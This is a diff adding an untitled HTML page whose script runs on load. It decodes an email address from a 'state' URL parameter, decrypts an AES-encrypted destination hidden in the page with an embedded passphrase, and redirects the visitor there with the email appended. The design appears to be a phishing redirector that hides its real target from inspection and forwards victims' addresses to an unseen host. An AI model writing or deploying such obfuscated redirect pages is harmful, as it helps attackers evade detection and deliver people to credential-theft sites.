@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <style>
+    html, body { margin: 0; padding: 0; background: #fff; }
+  </style>
+</head>
+<body>
+
+  <script>
+    
+    const CFG = {
+      passphrase: "utuffhgjutjututuyihl",
+salt:       "8bQAfgfmdpiO75skY9486g==",
+iv:         "ZDZyT/436VK6SisV",
+ciphertext: "kEq0G5DDmA0LKlmQNdh3zSD8iOuUjHCJdtmKQpn2FDr42HmJKCn2bSw//OSj2SF3eNXMCDdSiklc5A1HfZ9YHeuwK0ogWaQgjQ=="
+    };
+    
+
+    const enc      = new TextEncoder();
+    const b64Bytes = s => Uint8Array.from(atob(s), c => c.charCodeAt(0));
+
+    async function decryptDestination() {
+      const keyMaterial = await crypto.subtle.importKey(
+        "raw", enc.encode(CFG.passphrase), "PBKDF2", false, ["deriveKey"]
+      );
+      const key = await crypto.subtle.deriveKey(
+        { name: "PBKDF2", salt: b64Bytes(CFG.salt), iterations: 310000, hash: "SHA-256" },
+        keyMaterial,
+        { name: "AES-GCM", length: 256 },
+        false,
+        ["decrypt"]
+      );
+      const plaintext = await crypto.subtle.decrypt(
+        { name: "AES-GCM", iv: b64Bytes(CFG.iv) },
+        key,
+        b64Bytes(CFG.ciphertext)
+      );
+      return new TextDecoder().decode(plaintext);
+    }
+
+    async function run() {
+
+      const state = new URLSearchParams(window.location.search).get("state");
+      if (!state) { console.error("[redirect] blocked: no state param found in URL"); return; }
+
+      let email;
+      try { email = atob(state); } catch (e) { console.error("[redirect] blocked: atob failed on state:", e); return; }
+
+      console.log("[redirect] email decoded:", email);
+
+      let destination;
+      try { destination = await decryptDestination(); } catch (e) { console.error("[redirect] blocked: decryption failed:", e); return; }
+
+      console.log("[redirect] redirecting to:", destination + "/" + email);
+      window.location.href = destination + "/" + email;
+    }
+
+    run();
+  </script>
+</body>
+</html>
